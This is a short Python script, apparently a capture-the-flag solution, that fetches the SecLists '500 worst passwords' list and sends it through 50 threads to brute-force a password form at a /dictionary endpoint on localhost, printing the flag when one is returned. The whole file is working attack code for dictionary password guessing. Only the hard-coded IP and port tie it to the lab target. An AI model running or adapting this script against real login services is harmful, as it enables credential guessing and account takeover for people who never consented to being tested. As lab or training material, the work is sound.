import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import json

ip = "127.0.0.1"
port = 1234

def download_password_list():
    """Download and return password list"""
    print("📥 Downloading password list...")
    response = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt", timeout=10)
    passwords = [p.strip() for p in response.text.splitlines() if p.strip()]
    print(f"✅ Loaded {len(passwords)} passwords")
    return passwords

def try_password(password):
    """Try a single password and return result if successful"""
    try:
        response = requests.post(f"http://{ip}:{port}/dictionary", 
                               data={'password': password}, 
                               timeout=5)
        if response.ok:
            data = response.json()
            if 'flag' in data:
                return password, data['flag']
    except:
        pass  # Ignore errors/timeouts
    return None

def main():
    print("🚀 Starting multithreaded password brute force...")
    print(f"Target: http://{ip}:{port}/dictionary")
    
    # Download passwords
    passwords = download_password_list()
    
    found = False
    with ThreadPoolExecutor(max_workers=50) as executor:  # 50 threads for POST requests
        futures = {executor.submit(try_password, pwd): pwd for pwd in passwords}
        
        # Real-time progress bar
        with tqdm(total=len(passwords), desc="Trying passwords", unit="pwd") as pbar:
            for future in as_completed(futures):
                pwd = futures[future]
                result = future.result()
                pbar.update(1)
                
                if result:
                    password_found, flag = result
                    print(f"\n\n✅ CORRECT PASSWORD FOUND: '{password_found}'")
                    print(f"🏁 FLAG: {flag}")
                    found = True
                    break
    
    if not found:
        print(f"\n❌ No flag found in {len(passwords)} passwords")

if __name__ == "__main__":
    main()
